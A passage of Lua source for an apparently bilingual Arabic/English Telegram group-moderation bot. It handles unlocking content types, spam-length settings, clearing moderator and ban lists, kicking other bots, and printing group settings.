faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:location:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ location is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح المواقع سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "tag" or unmutepts[2] == "المعرف" then
if botx1:get(BOT..'tags:lock'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock tag ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح المعرف • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 56, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'tags:lock'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ tag is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح المعرف سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "strict" or unmutepts[2] == "الحمايه" then
if botx1:get(BOT..'bot:strict'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock strict ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الحمايه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:strict'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ strict is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الحمايه سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "hashtag" or unmutepts[2] == "الهاشتاك" then
if botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock hashtag ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الهاشتاك • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 58, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:hashtag:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ hashtag is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الهاشتاك سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "contact" or unmutepts[2] == "الجهات" then
if botx1:get(BOT..'bot:contact:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock contact ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الجهات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 56, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:contact:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ contact is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الجهات سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "webpage" or unmutepts[2] == "الشبكات" then
if botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock webpage ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الشبكات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:webpage:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ webpag is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الشبكات سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "arabic" or unmutepts[2] == "العربيه" then
if botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock arabic ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح العربيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:arabic:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ arabic is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح العربيه سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "english" or unmutepts[2] == "الانكليزيه" then
if botx1:get(BOT..'bot:english:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock english ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الانكليزيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 60, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:english:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ english is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الانكليزيه سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "tgservice" or unmutepts[2] == "الاشعارات" then
if botx1:get(BOT..'bot:tgservice:jk'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock tgservice ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الاشعارات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 59, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:tgservice:jk'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ tgservice is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الاشعارات سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "sticker" or unmutepts[2] == "الملصقات" then
if botx1:get(BOT..'bot:sticker:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock sticker ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الملصقات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 58, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:sticker:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ sticker is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الملصقات سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "fwd" or unmutepts[2] == "التوجيه" then
if botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock fwd ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح التوجيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:forward:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ fwd is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح التوجيه سابقا ✔️', 1, 'md')
end
end
end
end
end
------------------------------------bot-----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etspam (%d+)$") then
local sensspam = {string.match(text, "^([Ss]etspam) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Enter a number greater than 40 •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ اختر عدد اكبر من 40 حرف •', 1, 'md')
end
else
botx1:set(BOT..'bot:sens:spam'..msg.chat_id_,sensspam[2])
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع عدد الاحرف '..sensspam[2]..' •\n🚦⁞ اذا كانت الرساله فيها اكثر من '..sensspam[2]..' حرف •\n🚦⁞ انا سوف اقوم بحذفها •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Spam sensitivity has been set to [ ' ..sensspam[2]..' ]\n🚦⁞ Sentences have over '..sensspam[2]..' character will delete •', 1, 'md')
end
end
end
if text:match("^ضع عدد الاحرف (%d+)$") then
local sensspam = {string.match(text, "^(ضع عدد الاحرف) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Enter a number greater than 40 •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ اختر عدد اكبر من 40 حرف •', 1, 'md')
end
else
botx1:set(BOT..'bot:sens:spam'..msg.chat_id_,sensspam[2])
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع عدد الاحرف '..sensspam[2]..' •\n🚦⁞ اذا كانت الرساله فيها اكثر من '..sensspam[2]..' حرف •\n🎖⁞ انا سوف اقوم بحذفها •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Spam sensitivity has been set to [ ' ..sensspam[2]..' ]\n🚦⁞ Sentences have over '..sensspam[2]..' character will delete •', 1, 'md')
end
end
end
end     
-----------------------------------------------------------------------------------------------
if is_sudo(msg) then
if text:match("^[Ee]dit (.*)$") then
local editmsg = {string.match(text, "^([Ee]dit) (.*)$")}
edit(msg.chat_id_, msg.reply_to_message_id_, nil, editmsg[2], 1, 'html')
end
if text:match("^تعديل (.*)$") then
local editmsgs = {string.match(text, "^(تعديل) (.*)$")}
edit(msg.chat_id_, msg.reply_to_message_id_, nil,editmsgs[2], 1, 'html')
end
end
-----------------------------------------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Cc]lean (.*)$") or text:match("^مسح (.*)$") then
local txt = {string.match(text, "^([Cc]lean) (.*)$")}
local txts = {string.match(text, "^(مسح) (.*)$")}
if txt[2] == 'banlist' or txts[2] == 'المحظورين' then
botx1:del(BOT..'bot:banned:'..msg.chat_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Banlist has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح المحظورين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 36, string.len(msg.sender_user_id_))
end
end
if is_sudo(msg) then 
if txt[2] == 'banalllist' or txts[2] == 'قائمه العام' then
botx1:del(BOT..'bot:gban:')
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Banalllist has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح قائمه العام • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 38, string.len(msg.sender_user_id_))
end
end
end
if is_leader(msg) then 
if txt[2] == 'dev3' or txts[2] == 'مطورين الرتبه الثالثه' then
botx1:del(BOT..'bot:admins:')
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Banalllist has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح مطورين الرتبه الثالثه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 48, string.len(msg.sender_user_id_))
end
end
end
if txts[2] == 'البوتات' then
local botslist = function(extra, result)
local list = result.members_
for i = 0, #list do
if tonumber(list[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,list[i].user_id_)
end 
end
end
local bot = '🚦⁞ تم مسح البوتات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 34, string.len(msg.sender_user_id_))
getChannelMembers(msg.chat_id_, 0, "Bots", 100, botslist)
end
if txt[2] == 'modlist' or txts[2] == 'الادمنيه' then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Mod list has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح الادمنيه • \n🎖⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 35, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:momod:'..msg.chat_id_)
end
if txt[2] == 'donky list' or txts[2] == 'المطايه' then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Mod list has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح المطايه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 34, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:donky:'..msg.chat_id_)
end
if txt[2] == 'voplist' or txts[2] == 'الاعضاء المميزين' then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ VIP Members list has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح الاعضاء المميزين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 43, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:vipmem:'..msg.chat_id_)
end
if txt[2] == 'filterlist' or txts[2] == 'قائمه المنع' then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Filterlist has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح قائمه المنع • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 38, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:filters:'..msg.chat_id_)
end
if txt[2] == 'mutelist' or txts[2] == 'المكتومين' then
botx1:del(BOT..'bot:muted:'..msg.chat_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Muted users list has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح المكتومين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 36, string.len(msg.sender_user_id_))
end
end
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Cc]lean (.*)$") or text:match("^مسح (.*)$") then
local txt = {string.match(text, "^([Cc]lean) (.*)$")}
local txts = {string.match(text, "^(مسح) (.*)$")}
if txts[2] == 'قائمه المنع العام' then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Freelist has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح قائمه المنع العام • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 44, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:freewords:')
end
if txt[2] == 'owners' or txts[2] == 'المدراء' then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ owner list has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح المدراء • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 34, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:owners:'..msg.chat_id_)
end
if txt[2] == 'monsh' or txts[2] == 'المنشئين' then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ monsh list has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح المنشئين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 35, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:monsh:'..msg.chat_id_)
end
if txt[2] == 'momod all' or txts[2] == 'الادمنيه العامين' then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Mod all list has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح الادمنيه العامين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 43, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:moall:')
end
if txt[2] == 'vip all' or txts[2] == 'المميزين عام' then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ vip all list has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح المميزين عام • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 39, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:vpall:')
end
if txt[2] == 'ownerall' or txts[2] == 'المدراء العامين' then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Mod list has been cleared •', 1, 'md')
else
local bot = '🚦⁞ تم مسح المدراء العامين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 42, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:onall:')
end
end
end

if text:match("^مسح القوائم$") then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ هذه الخاصيه للمنشئ والرتب الاعلى منه •', 1, 'md')
else
botx1:del(BOT..'bot:banned:'..msg.chat_id_)
botx1:del(BOT..'bot:momod:'..msg.chat_id_)
botx1:del(BOT..'bot:donky:'..msg.chat_id_)
botx1:del(BOT..'bot:vipmem:'..msg.chat_id_)
botx1:del(BOT..'bot:filters:'..msg.chat_id_)
botx1:del(BOT..'bot:muted:'..msg.chat_id_)
botdx(msg.chat_id_, msg.id_, 1, '🀄️ ⁞ تم مسح المحظورين •\n☑️ ⁞ تم مسح الادمنيه •\n🐴 ⁞ تم مسح المطايه •\n🌟 ⁞ تم مسح المميزين •\n🚫 ⁞ تم مسح قائمه المنع •\n🔇 ⁞ تم مسح المكتومين •\n\n🚦⁞ تم مسح هذه القوائم بواسطه '..renk_bot(msg)..' •', 1, 'md')
end
end
------------------------------bot-----------------------------------------------------------------   
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]ettings$") or text:match("^الاعدادات$") then
if botx1:get(BOT..'bot:muteall'..msg.chat_id_) then
mute_all = 'مفعل 🚩'
else
mute_all = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:text:mute'..msg.chat_id_) then
mute_text = 'مفعل 🚩'
else
mute_text = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:photo:mute'..msg.chat_id_) then
mute_photo = 'مفعل 🚩'
else
mute_photo = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:video:mute'..msg.chat_id_) then
mute_video = 'مفعل 🚩'
else
mute_video = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:gifs:mute'..msg.chat_id_) then
mute_gifs = 'مفعل 🚩'
else
mute_gifs = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
mute_flood = 'مفعل 🚩'
else
mute_flood = 'معطل 📍'
end
------------bot
if not botx1:get(BOT..'flood:max:'..msg.chat_id_) then
flood_m = 5
else
flood_m = botx1:get(BOT..'flood:max:'..msg.chat_id_)
end
------------bot
if not botx1:get(BOT..'bot:sens:spam'..msg.chat_id_) then
spam_c = 250
else
spam_c = botx1:get(BOT..'bot:sens:spam'..msg.chat_id_)
end
------------bot
if botx1:get(BOT..'floodstatus'..msg.chat_id_) == "DelMsg" then
floodstatus = "بالمسح 🚩"
elseif botx1:get(BOT..'floodstatus'..msg.chat_id_) == "Kicked" then
floodstatus = "بالطرد 📍"
elseif not botx1:get(BOT..'floodstatus'..msg.chat_id_) then
floodstatus = "بالمسح 🚩"
end
----------------------------------------------------bot
if botx1:get(BOT..'bot:music:mute'..msg.chat_id_) then
mute_music = 'مفعل 🚩'
else
mute_music = 'معطل 📍'
end
------------faedee
if botx1:get(BOT..'bot:bots:ban'..msg.chat_id_) then
mute_bots = 'مفعل 🚩'
else
mute_bots = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:inline:mute'..msg.chat_id_) then
mute_in = 'مفعل 🚩'
else
mute_in = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:cmds'..msg.chat_id_) then
mute_cmd = 'مفعل 🚩'
else
mute_cmd = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:voice:mute'..msg.chat_id_) then
mute_voice = 'مفعل 🚩'
else
mute_voice = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'editmsg'..msg.chat_id_) then
mute_edit = 'مفعل 🚩'
else
mute_edit = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:links:mute'..msg.chat_id_) then
mute_links = 'مفعل 🚩'
else
mute_links = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:pin:mute'..msg.chat_id_) then
lock_pin = 'مفعل 🚩'
else
lock_pin = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:sticker:mute'..msg.chat_id_) then
lock_sticker = 'مفعل 🚩'
else
lock_sticker = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:tgservice:jk'..msg.chat_id_) then
lock_tgservice = 'مفعل 🚩'
else
lock_tgservice = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) then
lock_wp = 'مفعل 🚩'
else
lock_wp = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:strict'..msg.chat_id_) then
strict = 'مفعل 🚩'
else
strict = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) then
lock_htag = 'مفعل 🚩'
else
lock_htag = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'tags:lock'..msg.chat_id_) then
lock_tag = 'مفعل 🚩'
else
lock_tag = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:location:mute'..msg.chat_id_) then
lock_location = 'مفعل 🚩'
else
lock_location = 'معطل 🎈'
end
------------bot
if botx1:get(BOT..'bot:contact:mute'..msg.chat_id_) then
lock_contact = 'مفعل 🚩'
else
lock_contact = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:english:mute'..msg.chat_id_) then
lock_english = 'مفعل 🚩'
else
lock_english = 'معطل 📍'
end
------------fader
if botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) then
lock_arabic = 'مفعل 🚩'
else
lock_arabic = 'معطل 📍'
end
------------fader
if botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) then
lock_forward = 'مفعل 🚩'
else
lock_forward = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:document:mute'..msg.chat_id_) then
lock_file = 'مفعل 🚩'
else
lock_file = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'markdown:lock'..msg.chat_id_) then
markdown = 'مفعل 🚩'
else
markdown = 'معطل 📍'
end
------------bot
if botx1:get(BOT..'bot:spam:mute'..msg.chat_id_) then
lock_spam = 'مفعل 🚩'
else
lock_spam = 'معطل 📍'
end
------------bot
if botx1:get(BOT.."bot:welcome"..msg.chat_id_) then
send_welcome = 'مفعل 🚩'
else
send_welcome = 'معطل 📍'
end
------------bot
local TXTAR = "🎖⁞ اعدادات المجموعه 🔻 :\n\n"
.."🚦⁞ قفل الحمايه • "..strict.."\n"
.."🚦⁞ قفل الكل • "..mute_all.."\n"
.."🚦⁞ قفل الشارحه • "..mute_cmd.."\n\n"
.."🎖⁞ اعدادات اخرى:🔻 :\n\n"
.."🚦⁞ قفل الكلايش • "..lock_spam.."\n"
.."🚦⁞ قفل الروابط • "..mute_links.."\n"
.."️🚦⁞ قفل الشبكات • "..lock_wp.."\n"
.."🚦⁞ قفل المعرف • "..lock_tag.."\n"
.."🚦⁞ قفل الهاشتاك • "..lock_htag.."\n"
.."🚦⁞ قفل التوجيه • "..lock_forward.."\n"
.."🚦⁞ قفل البوتات •  "..mute_bots.."\n"
.."🚦⁞ قفل العديل •  "..mute_edit.."\n"
.."🚦⁞ قفل التثبيت • "..lock_pin.."\n"
.."🚦⁞ قفل الاونلاين • "..mute_in.."\n"
.."🚦⁞ قفل العربيه •  "..lock_arabic.."\n"
.."🚦⁞ قفل الانكليزيه • "..lock_english.."\n"
.."🚦⁞ قفل الماركداون • "..markdown.."\n"
.."️🚦⁞ قفل الاشعارات • "..lock_tgservice.."\n"
.."🚦⁞ قفل التكرار • "..mute_flood.."\n"
.."🚦⁞ خاصيه التكرار • "..floodstatus.."\n"
.."🚦⁞ عدد التكرار • [ "..flood_m.." ]\n"
.."️🚦⁞ عدد السبام • [ "..spam_c.." ]\n\n"
.."🎖⁞ المزيد من الاعدادات 🔻 :\n\n"
.."🚦⁞ قفل الدردشه • "..mute_text.."\n"
.."🚦⁞ قفل الصور • "..mute_photo.."\n"
.."🚦⁞ قفل الفيديو • "..mute_video.."\n"
.."🚦⁞ قفل المتحركه • "..mute_gifs.."\n"
.."🚦⁞ قفل الاغاني • "..mute_music.."\n"
.."🚦⁞ قفل الصوت • "..mute_voice.."\n"
.."🚦⁞ قفل الملفات • "..lock_file.."\n"
.."🚦⁞ قفل الملصقات • "..lock_sticker.."\n"
.."🚦⁞ قفل الجهات • "..lock_contact.."\n"
.."️ 🚦⁞ قفل المواقع • "..lock_location.."\n"
local TXTEN = "⚙ Group Settings :\n\n"
.."◾️ *Strict Mode* : "..strict.."\n"
.."◾️ *Group lock All* : "..mute_all.."\n"
.."◾️ *Case of no answer* : "..mute_cmd.."\n\n"
.."⚠️ *Centerial Settings* :\n\n"
.."◾️ *Lock Spam* : "..lock_spam.."\n"
.."◾️ *Lock Links* : "..mute_links.."\n"
.."️◾️ *Lock Web-Page* :  "..lock_wp.."\n"
.."◾️ *Lock Tag* : "..lock_tag.."\n"
.."️◾️ *Lock Hashtag* : "..lock_htag.."\n"
.."◾️ *Lock Forward* : "..lock_forward.."\n"
.."◾️ *Lock Bots* :  "..mute_bots.."\n"
.."️◾️ *Lock Edit* :  "..mute_edit.."\n"
.."️◾️ *Lock Pin* : "..lock_pin.."\n"
.."◾️ *Lock Inline* : "..mute_in.."\n"
.."◾️ *Lock arabic* :  "..lock_arabic.."\n"
.."◾️ *Lock English* : "..lock_english.."\n"
